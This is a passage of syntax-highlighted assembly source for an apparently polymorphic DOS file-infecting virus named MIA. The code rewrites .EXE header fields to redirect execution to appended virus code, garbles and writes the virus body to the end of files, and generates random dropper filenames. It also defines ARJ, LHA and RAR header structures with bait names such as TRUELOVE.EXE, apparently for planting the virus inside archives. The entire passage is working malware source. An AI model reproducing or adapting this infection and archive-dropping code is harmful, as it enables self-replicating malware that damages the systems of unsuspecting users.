 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Finishing_Touch</span><span class="sc0">
                               </span><span class="sc1">; Here We go, here We go!</span><span class="sc0">
</span><span class="sc5">Offensive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get low-size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Divide by 16</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Subtract .EXE header size from file size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; DX holds delta offset</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">MultiFormer</span><span class="sc0">            </span><span class="sc1">; Garble and write virus codes to EOF</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Crafty</span><span class="sc0">                 </span><span class="sc1">; Jump if error or disk full</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Brand-new IP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Brand-new CS</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Brand-new SS</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Initial stack: (SS:0200h)</span><span class="sc0">

 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">              </span><span class="sc1">; Adjust for new .EXE file size</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">               </span><span class="sc1">; Affect hi-word file size</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">; Divide new loadable module by 512</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Is there a remainder?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Constant</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; if yes, then add a page</span><span class="sc0">

</span><span class="sc5">Constant</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Number of needed 512-page to hold .EXE file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Remainder bytes</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">               </span><span class="sc1">; Next line, adjust memory field for virus stack</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Check minimum memory field...</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Vigil</span><span class="sc0">                  </span><span class="sc1">; Jump if CF=0, enough space for initial stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Min memory paragraph = 16</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Max memory must be above or same with min memory</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Vigil</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Max memory paragraph = 16</span><span class="sc0">

</span><span class="sc5">Vigil</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Aim R/W Pointer to the BOF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">; CX = 0018h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Neat</span><span class="sc0">

</span><span class="sc5">Exe_Check</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5A4Dh</span><span class="sc0">               </span><span class="sc1">; 'MZ' - Mark Zbikowski (architect of MS-DOS)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Valid_Exe</span><span class="sc0">               
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4D5Ah</span><span class="sc0">               </span><span class="sc1">; 'ZM' - Zbikowski Mark (?)</span><span class="sc0">

</span><span class="sc5">Valid_Exe</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒ[ Create random filename with .COM/.EXE extension ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Random_Name</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Get random number of characters in dropper's</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; filename </span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; SI acts as counter (number of characters)</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">Build_Name</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Get random word</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">                 </span><span class="sc1">; Number or letter?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Number</span><span class="sc0">                 </span><span class="sc1">; Jump if number</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Just_Skip</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc0">                </span><span class="sc1">; Including '-'</span><span class="sc0">

</span><span class="sc5">Just_Skip</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; Skip 7 ASCII characters</span><span class="sc0">

</span><span class="sc5">Number</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Put the character</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; Decrease counter (i.e. number of letters in</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Build_Name</span><span class="sc0">             </span><span class="sc1">; filename)</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">432Eh</span><span class="sc0">               
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Put .COM extension</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4D4Fh</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Commit</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0817h</span><span class="sc0">               </span><span class="sc1">; Oh, MIA may use .EXE extension too, 8-)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">Commit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         
 </span><span class="sc6">ret</span><span class="sc0">


                        </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Nemo</span><span class="sc0"> </span><span class="sc5">sine</span><span class="sc0"> </span><span class="sc5">cruce</span><span class="sc0"> </span><span class="sc5">beatus</span><span class="sc0">!


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; CRC-32 generator,  note that this subroutine was stolen from Zhengxi, Ltd.,</span><span class="sc0">
</span><span class="sc1">; Russia. Yeah,  this routine suits MIA fine, I like it 'cause it's so small,</span><span class="sc0">
</span><span class="sc1">; no need for huge CRC-32 table,  for instance,  Necrosoft Enterprises' needs</span><span class="sc0">
</span><span class="sc1">; 1024 bytes of memory! (excluding the routine itself). 8-(</span><span class="sc0">
</span><span class="sc1">; On entry: DS:SI = first byte of data to be calculated</span><span class="sc0">
</span><span class="sc1">;           DI    = number of bytes of data to be calculated</span><span class="sc0">
</span><span class="sc1">; Return:   AX    = destroyed</span><span class="sc0">
</span><span class="sc1">;           CX:DX = CRC-32 value</span><span class="sc0">
</span><span class="sc1">;           DS:SI = first byte after last byte of data</span><span class="sc0">
</span><span class="sc1">;           DI    = zero</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">                         
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">              
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; CX = DX = NOT zero</span><span class="sc0">
                               
</span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Get a byte of data</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; Xor it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Shift byte per byte</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Process 8 bits</span><span class="sc0">

</span><span class="sc5">More</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 
 </span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Exclude</span><span class="sc0">                </span><span class="sc1">; Jump if CF=0</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8320h</span><span class="sc0">  
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">      
                               
</span><span class="sc5">Exclude</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc0">                     </span><span class="sc1">; Eight times shifting?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">More</span><span class="sc0">                   </span><span class="sc1">; Not yet, loop</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Decrease counter</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Next</span><span class="sc0">                   </span><span class="sc1">; Jump if ZF=0</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ .ARJ packed file's header structure ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Marker</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0EA60h</span><span class="sc0">          </span><span class="sc1">; ARJ valid archive signature</span><span class="sc0">
</span><span class="sc5">Head_1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">Basic</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_2</span><span class="sc0">
</span><span class="sc5">Head_2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fleet</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">07h</span><span class="sc0">          </span><span class="sc1">; ARJ version number (which archived this)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; Oldest version of ARJ that can be used</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; ARJ's host OS (0 = MS-DOS, 1 = PRIMOS, etc.)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; Some flags (password, path name, etc.)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Compression method, zero = no compression</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Type of file, zero = binary file</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">49h</span><span class="sc0">          </span><span class="sc1">; Reserved field?</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0CE534800h</span><span class="sc0">          </span><span class="sc1">; Date and time stamps, 02-19-2083 09:00:00a</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Compressed file size</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Original file size</span><span class="sc0">
</span><span class="sc5">ARJ_CRC</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">41494D20h</span><span class="sc0">          </span><span class="sc1">; Packed file's CRC-32</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">          </span><span class="sc1">; Entry name position in filename</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0021h</span><span class="sc0">          </span><span class="sc1">; ARJ access mode (attributes)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">          </span><span class="sc1">; ARJ's host data</span><span class="sc0">
</span><span class="sc5">Fleet</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TRUELOVE.EXE'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; ASCIZ filename</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">4Dh</span><span class="sc0">          </span><span class="sc1">; ASCIZ file comment</span><span class="sc0">
</span><span class="sc10">Basic</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">4F495241h</span><span class="sc0">          </span><span class="sc1">; ARJ basic header's CRC-32</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒ[ .LHA/.LZH/.PAK packed file's header structure ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Head_3</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARType</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Method</span><span class="sc0">
</span><span class="sc5">Head_4</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Header checksum byte</span><span class="sc0">
</span><span class="sc5">Method</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-lh0-'</span><span class="sc0">             </span><span class="sc1">; Archive method: stored "as is"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Compressed file size</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Original file size</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0CE534800h</span><span class="sc0">          </span><span class="sc1">; Date and time stamps, 02-19-2083 09:00:00a</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0120h</span><span class="sc0">          </span><span class="sc1">; Flags?</span><span class="sc0">
</span><span class="sc5">LHA_FNS</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LHA_CRC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Filing</span><span class="sc0">
</span><span class="sc5">Filing</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SUPERFLY.COM'</span><span class="sc0">      </span><span class="sc1">; Filename (without ASCIZ)</span><span class="sc0">
</span><span class="sc5">LHA_CRC</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">          </span><span class="sc1">; Packed file's CRC-16</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">4Dh</span><span class="sc0">          </span><span class="sc1">; Some stuff?</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ .RAR packed file's header structure ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Head_5</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">          </span><span class="sc1">; RAR header's CRC</span><span class="sc0">
</span><span class="sc5">RARType</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">74h</span><span class="sc0">          </span><span class="sc1">; Archive type?</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8000h</span><span class="sc0">          </span><span class="sc1">; Some flags (volume, password, comment, etc.)</span><span class="sc0">
</span><span class="sc5">Head_6</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MultiFormer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_5</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Compressed file size</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Original file size</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; RAR's host OS</span><span class="sc0">
</span><span class="sc5">RAR_CRC</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">352D4949h</span><span class="sc0">          </span><span class="sc1">; Packed file's CRC-32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0CE534800h</span><span class="sc0">          </span><span class="sc1">; Date and time stamps, 02-19-2083 09:00:00a</span><span class="sc0">
